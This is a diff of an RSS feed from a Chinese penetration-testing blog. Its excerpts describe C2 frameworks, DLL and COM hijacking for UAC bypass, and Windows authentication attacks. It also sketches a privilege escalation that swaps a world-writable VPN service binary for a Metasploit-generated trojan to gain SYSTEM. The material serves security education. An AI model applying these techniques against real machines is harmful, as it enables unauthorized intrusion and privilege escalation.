@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内网渗透 on 倾旋的博客</title><link>https://payloads.online/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link><description>Recent content in 内网渗透 on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Sat, 30 Mar 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml"/><item><title>OWASP - 吉林沙龙《后渗透与邮件安全》 议题解读</title><link>https://payloads.online/archivers/2019-03-30/2/</link><pubDate>Sat, 30 Mar 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-03-30/2/</guid><description>&lt;blockquote&gt;
-&lt;p&gt;在线地址：&lt;a href="https://www.bilibili.com/video/av51712186/"&gt;https://www.bilibili.com/video/av51712186/&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;在线地址：&lt;a href="https://www.bilibili.com/video/av51712186/"&gt;https://www.bilibili.com/video/av51712186/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;iframe src="//player.bilibili.com/player.html?aid=51712186&amp;page=1&amp;cid=" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="95%" height="450"&gt; &lt;/iframe&gt;
 &lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;本文的研究与收获，话费了我近一个季度的时间去掌握，写下这篇文章的意义就在于给自己一个总结，另外，由衷感谢我的前辈给予我的指导，一言一行影响着我。&lt;/p&gt;
@@ -12,24 +13,36 @@
 &lt;p&gt;C2，其含义在安全领域中意思是命令与控制，具体的技术表现为远控木马。
 是一种通常用于持续控制一个或多个目标的技术手段，这个技术手段覆盖了&lt;strong&gt;多种&lt;/strong&gt;网络通信（计算机交互、通信）的方式。&lt;/p&gt;
 &lt;p&gt;这个“多种”指的是有很多种方式，基于HTTP、SMTP、HTTPS、纯数据报文、&amp;hellip;.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/544f0bbe-4f5f-11ec-8dda-00d861bf4abb.png" alt="2019-03-30-13-59-17"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/544f0bbe-4f5f-11ec-8dda-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-03-30-13-59-17"&gt;
+ &lt;img src="https://images.payloads.online/544f0bbe-4f5f-11ec-8dda-00d861bf4abb.png" alt="2019-03-30-13-59-17" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;h2 id="0x03-c2的原理"&gt;0x03 C2的原理&lt;/h2&gt;
 &lt;p&gt;命令与控制的原理就是目标机器主动或被动的与控制端进行交互，不断获取指令执行。&lt;/p&gt;
 &lt;p&gt;交互：可能不是一个直接的网络连接&lt;/p&gt;
 &lt;p&gt;命令与控制在行为上一般需要与许多操作系统接口进行交互，例如：网络通信、文件读写、进程管理等。&lt;/p&gt;
 &lt;h2 id="0x04-后渗透平台--cobalt-strike"&gt;0x04 后渗透平台 – Cobalt Strike&lt;/h2&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/54b23a54-4f5f-11ec-8073-00d861bf4abb.png" alt="2019-03-30-14-01-17"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/54b23a54-4f5f-11ec-8073-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-03-30-14-01-17"&gt;
+ &lt;img src="https://images.payloads.online/54b23a54-4f5f-11ec-8073-00d861bf4abb.png" alt="2019-03-30-14-01-17" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;Cobalt Strike是一个跨平台、多人协作式、红队评估后渗透平台。
 它支持多人通信、权限维持、文件操作、提权、横向渗透……等多种功能，使用者只需要部署好teamserver就可以在任意平台上连接teamserver进行渗透。&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.cobaltstrike.com/"&gt;https://www.cobaltstrike.com/&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id="0x05-后渗透平台--metasploit-framework"&gt;0x05 后渗透平台 – Metasploit Framework&lt;/h2&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/54ecdbb4-4f5f-11ec-8615-00d861bf4abb.png" alt="2019-03-30-14-02-15"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/54ecdbb4-4f5f-11ec-8615-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-03-30-14-02-15"&gt;
+ &lt;img src="https://images.payloads.online/54ecdbb4-4f5f-11ec-8615-00d861bf4abb.png" alt="2019-03-30-14-02-15" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;Metasploit Framework是一个跨平台、开源、较为开放式的安全评估平台。
 它支持权限维持、文件操作、提权、横向渗透、载荷生成……等多种功能，使得渗透更加灵活。&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.metasploit.com/"&gt;https://www.metasploit.com/&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id="0x06-后渗透的需求"&gt;0x06 后渗透的需求&lt;/h2&gt;
 &lt;p&gt;通过一些常用的平台、工具总结，我得出一些以下几个基本需求：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/55265e0c-4f5f-11ec-8636-00d861bf4abb.png" alt="2019-03-30-14-03-35"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/55265e0c-4f5f-11ec-8636-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-03-30-14-03-35"&gt;
+ &lt;img src="https://images.payloads.online/55265e0c-4f5f-11ec-8636-00d861bf4abb.png" alt="2019-03-30-14-03-35" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;这些需求就必定要形成一个跨平台支持、兼容性最好、拓展性强的框架，而大部分框架的基础模式就是如下所说。&lt;/p&gt;
 &lt;h3 id="框架基本组成"&gt;框架基本组成&lt;/h3&gt;
 &lt;ul&gt;
@@ -38,27 +51,20 @@
 &lt;li&gt;漏洞&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="0x07-payload进入目标机器内存的方式"&gt;0x07 PAYLOAD进入目标机器内存的方式&lt;/h2&gt;
-&lt;p&gt;在常规的渗透过程里，为了获得一定的权限，基本上绝大部分的动机都是在目标机器上的内存种执行指令，它的表现形式大部分都是一个后门、加载器等。&lt;/p&gt;
-&lt;p&gt;而进入的方式就如下：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;文件上传木马执行 – 落地&lt;/li&gt;
-&lt;li&gt;Powershell -&amp;gt; IEX&lt;/li&gt;
-&lt;li&gt;DLL注入 -&amp;gt; regsvr32、rundll32&lt;/li&gt;
-&lt;li&gt;.NET技术 -&amp;gt; .cs -&amp;gt; csc.exe -&amp;gt; target.exe&lt;/li&gt;
-&lt;li&gt;……&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id="0x08-payload的类型"&gt;0x08 PAYLOAD的类型&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;独立版&lt;/li&gt;
-&lt;li&gt;DLL Injection（DLL注入）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Reflective DLL injection（反射DLL注入）&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;Stager&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;其中，大部分默认情况下，Metasploit生成的都是Stager，可以把它作为一个支持众多模块的通用加载器，而模块的表现形式就是Shellcode、DLL甚至EXE等PE格式的文件。&lt;/p&gt;</description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>&lt;p&gt;&lt;img src="https://images.payloads.online/4b0d4868-4f5f-11ec-b255-00d861bf4abb.png" alt="2019-01-26-18-26-19"&gt;&lt;/p&gt;
+&lt;p&gt;在常规的渗透过程里，为了获得一定的权限，基本上绝大部分的动机都是在目标机器上的内存种执行指令，它的表现形式大部分都是一个后门、加载器等。&lt;/p&gt;</description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>&lt;p&gt;&lt;a href="https://images.payloads.online/4b0d4868-4f5f-11ec-b255-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-01-26-18-26-19"&gt;
+ &lt;img src="https://images.payloads.online/4b0d4868-4f5f-11ec-b255-00d861bf4abb.png" alt="2019-01-26-18-26-19" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;首先这是DLL项目，找到调试选项：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/4b56af1c-4f5f-11ec-bf14-00d861bf4abb.png" alt="2019-01-26-18-30-06"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/4b56af1c-4f5f-11ec-bf14-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-01-26-18-30-06"&gt;
+ &lt;img src="https://images.payloads.online/4b56af1c-4f5f-11ec-bf14-00d861bf4abb.png" alt="2019-01-26-18-30-06" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;调用rundll32 来调试：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/4b915360-4f5f-11ec-ab27-00d861bf4abb.png" alt="2019-01-26-18-30-47"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/4b915360-4f5f-11ec-ab27-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-01-26-18-30-47"&gt;
+ &lt;img src="https://images.payloads.online/4b915360-4f5f-11ec-ab27-00d861bf4abb.png" alt="2019-01-26-18-30-47" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;这样就可以进行调试了。&lt;/p&gt;</description></item><item><title>Windows 2019 Bypass (UAC、Defender) to Metasploit</title><link>https://payloads.online/archivers/2019-01-26/1/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/1/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;昨天下午在小密圈看到一篇文章：https://egre55.github.io/system-properties-uac-bypass/&lt;/p&gt;
 &lt;p&gt;文中指出 &lt;code&gt;SystemPropertiesAdvanced.exe&lt;/code&gt; 有DLL劫持漏洞，经过分析，在Windows 10下无法复现&lt;/p&gt;
@@ -95,10 +101,14 @@
 &lt;h2 id="0x03-总结"&gt;0x03 总结&lt;/h2&gt;
 &lt;p&gt;UAC、DLL劫持、COM劫持的问题肯定还会有很多、但是以前的轮子到现在拿起来用基本上都会被行为拦截，这就需要掌握原理去自己探索、创造。&lt;/p&gt;
 &lt;p&gt;系统镜像：&lt;code&gt;ed2k://|file|cn_windows_server_2019_x64_dvd_4de40f33.iso|5086887936|7DCDDD6B0C60A0D019B6A93D8F2B6D31|/&lt;/code&gt;&lt;/p&gt;</description></item><item><title>DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</title><link>https://payloads.online/archivers/2018-12-22/1/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-22/1/</guid><description>&lt;blockquote&gt;
-&lt;p&gt;在线地址：&lt;a href="https://www.bilibili.com/video/av51718274/"&gt;https://www.bilibili.com/video/av51718274/&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;在线地址：&lt;a href="https://www.bilibili.com/video/av51718274/"&gt;https://www.bilibili.com/video/av51718274/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;iframe src="//player.bilibili.com/player.html?aid=51718274&amp;page=1&amp;cid" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="95%" height="450"&gt; &lt;/iframe&gt;
 &lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/44d01a48-4f5f-11ec-8721-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/44d01a48-4f5f-11ec-8721-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/44d01a48-4f5f-11ec-8721-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;本文章只是方便阅读PPT，对于深入的去理解没有太大帮助，只是做个知识索引。&lt;/p&gt;
 &lt;p&gt;目录如下：&lt;/p&gt;
 &lt;ul&gt;
@@ -123,7 +133,10 @@
 &lt;p&gt;即：“在正常事物发生之前进行一个旁路操作”&lt;/p&gt;
 &lt;h2 id="0x02-dll是什么"&gt;0x02 DLL是什么&lt;/h2&gt;
 &lt;p&gt;DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/4516d88e-4f5f-11ec-971e-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/4516d88e-4f5f-11ec-971e-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/4516d88e-4f5f-11ec-971e-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;在Windows平台下，我们使用的应用程序中的功能其实大多都很相似，窗口调用窗口的模块，分配内存调用内存管理的模块，文件操作调用IO模块，这些模块在Windows里的具体表现就是DLL文件。&lt;/p&gt;
 &lt;h2 id="0x03-dll的加载过程"&gt;0X03 DLL的加载过程&lt;/h2&gt;
 &lt;ul&gt;
@@ -136,12 +149,12 @@
 &lt;/ul&gt;
 &lt;p&gt;PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。&lt;/p&gt;
 &lt;p&gt;注册表路径：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/456a6e72-4f5f-11ec-b36a-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/456a6e72-4f5f-11ec-b36a-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/456a6e72-4f5f-11ec-b36a-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;h3 id="dll的加载过程--know-dlls注册表项"&gt;DLL的加载过程 – Know DLLs注册表项&lt;/h3&gt;
-&lt;p&gt;Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/45b927d8-4f5f-11ec-9b6b-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
-&lt;h3 id="dll的加载过程--process-monitor"&gt;DLL的加载过程 – Process Monitor&lt;/h3&gt;
-&lt;p&gt;Process Monitor是Windows的高级监视工具，可显示实时文件系统，注册表和进程/线程活动。&lt;/p&gt;</description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p&gt;在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p&gt;
+&lt;p&gt;Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。&lt;/p&gt;</description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p&gt;在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Pass The Hash&lt;/li&gt;
 &lt;li&gt;Silver Tickets、Golden Tickets、&lt;/li&gt;
@@ -201,19 +214,22 @@
 &lt;p&gt;首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。&lt;/p&gt;
 &lt;p&gt;CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。&lt;/p&gt;
 &lt;p&gt;也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2f2090f6-4f5f-11ec-a05c-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/2f2090f6-4f5f-11ec-a05c-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/2f2090f6-4f5f-11ec-a05c-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;按下Ctrl+R打开运行窗口，键入 &lt;code&gt;::{20D04FE0-3AEA-1069-A2D8-08002B30309D}&lt;/code&gt;即可打开“我的电脑”&lt;/p&gt;
 &lt;p&gt;回收站的CLISD是：&lt;code&gt;::{645FF040-5081-101B-9F08-00AA002F954E}&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id="clsid是如何创建的"&gt;CLSID是如何创建的&lt;/h3&gt;
 &lt;p&gt;CLSID结构体：&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {  
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	DWORD Data1; &lt;span style="color:#75715e"&gt;// 随机数  
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;	WORD Data2; &lt;span style="color:#75715e"&gt;// 和时间相关  
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;	WORD Data3; &lt;span style="color:#75715e"&gt;// 和时间相关  
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;	BYTE Data4[&lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;]; &lt;span style="color:#75715e"&gt;// 和网卡MAC相关 
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;	} GUID;  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	WORD Data2; &lt;span style="color:#75715e"&gt;// 和时间相关  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	WORD Data3; &lt;span style="color:#75715e"&gt;// 和时间相关  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	BYTE Data4[&lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;]; &lt;span style="color:#75715e"&gt;// 和网卡MAC相关 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	} GUID;  
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; GUID CLSID;  &lt;span style="color:#75715e"&gt;// 组件ID 
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;	&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; GUID IID;    &lt;span style="color:#75715e"&gt;// 接口ID
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; GUID IID;    &lt;span style="color:#75715e"&gt;// 接口ID
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过操作系统提供的结构体与API来创建CLSID，保障唯一性。&lt;/p&gt;</description></item><item><title>Windows 本地特权提升技巧</title><link>https://payloads.online/archivers/2018-10-08/1/</link><pubDate>Mon, 08 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-08/1/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;本文主要有以下章节：&lt;/p&gt;
 &lt;ul&gt;
@@ -231,7 +247,10 @@
 &lt;p&gt;在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;我选择一个名为&lt;code&gt;“gwservice”&lt;/code&gt;的项，查看该项下的所有值：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;其中有一个ImagePath的名称，它的值是：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;可见它是一个VPN相关的服务，下面有两种提权可能：&lt;/p&gt;
@@ -240,38 +259,45 @@
 &lt;li&gt;2.若这个ImagePath所指向的目录权限可控，那么我们也可以替换&lt;code&gt;gwservice.exe&lt;/code&gt;，从而当服务启动的时候，就能够执行我们的应用程序（木马）。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;但是很遗憾，第1种不行：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2901bf24-4f5f-11ec-be22-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/2901bf24-4f5f-11ec-be22-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/2901bf24-4f5f-11ec-be22-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;当前用户没有足够的权限。&lt;/p&gt;
 &lt;p&gt;尝试第二种方法，使用“icacls”命令查看目录权限：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" alt=""&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+
 惊喜的发现，&lt;code&gt;“Everyone”&lt;/code&gt;用户可以读写该目录下所有文件。&lt;/p&gt;
 &lt;p&gt;Ps:Everyone代指当前主机下所有用户，包含（Guest）&lt;/p&gt;
 &lt;h3 id="提权过程"&gt;提权过程&lt;/h3&gt;
 &lt;p&gt;首先，我启用了win7的Guest用户，使用Guest用户登录这台机器：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png" alt=""&gt;
-&lt;img src="https://images.payloads.online/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png" alt=""&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+
+&lt;a href="https://images.payloads.online/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+
 Ping命令都不让用，限制很死。&lt;/p&gt;
 &lt;p&gt;使用msf生成一个木马：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png" alt=""&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+
 将木马替换为gwservice.exe&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png" alt=""&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+
 先执行测试一下，能否获得Guest的session：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png" alt=""&gt;
-获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2ab054b6-4f5f-11ec-90e5-00d861bf4abb.png" alt=""&gt;
-提权情况还是要根据服务器本身的环境，我总结的这些方法就是为了优先采用这些方式，而不是直接突突搞EXP ……&lt;/p&gt;
-&lt;h2 id="0x02-模糊路径提权"&gt;0x02 模糊路径提权&lt;/h2&gt;
-&lt;p&gt;在上一篇中，我们继续基于&lt;code&gt;Gateway Session Service&lt;/code&gt;这个服务进行分析其他提权方法：&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/2af42196-4f5f-11ec-b362-00d861bf4abb.png" alt=""&gt;
-其中有一个ImagePath的名称，它的值是：&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;当服务启动时，将会读取这个ImagePath的值，我们无法更改这个值，但是可以通过Windows的特性来巧妙提权。
-注意：当前这个环境只是演示，排除目录权限的原因是100%成功的。&lt;/p&gt;
-&lt;p&gt;重点：当ImagePath的值不是一个绝对路径时，我们可以通过Windows API中的&lt;code&gt;“CreateProcessA”&lt;/code&gt;函数的特性，将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。&lt;/p&gt;
-&lt;p&gt;例子：&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;C:\Program Files (x86)\server process\ssl\service.exe&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;如果不是绝对路径，寻找过程如下：&lt;/p&gt;</description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>&lt;h2 id="0x00-dll劫持简介"&gt;0x00 DLL劫持简介&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+
